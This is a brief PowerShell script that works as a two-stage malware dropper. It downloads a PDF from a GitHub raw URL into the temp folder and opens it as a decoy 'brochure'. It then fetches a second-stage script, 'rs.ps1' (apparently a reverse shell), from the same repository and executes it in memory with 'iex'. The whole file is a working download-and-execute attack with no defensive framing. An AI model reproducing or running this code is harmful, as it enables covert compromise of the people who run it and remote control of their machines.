# Define the URL and output file path
$PdfUrl = "https://raw.githubusercontent.com/matteoporfi/tokens/refs/heads/main/sample-1.pdf" 
$OutputPath = "$env:TEMP\brochure.pdf"

# Download the PDF
Invoke-WebRequest -Uri $PdfUrl -OutFile $OutputPath

# Open the downloaded PDF
Start-Process -FilePath $OutputPath

# Download stage 2
$pl = iwr https://raw.githubusercontent.com/matteoporfi/tokens/refs/heads/main/rs.ps1

# Execute Stage 2
iex $pl
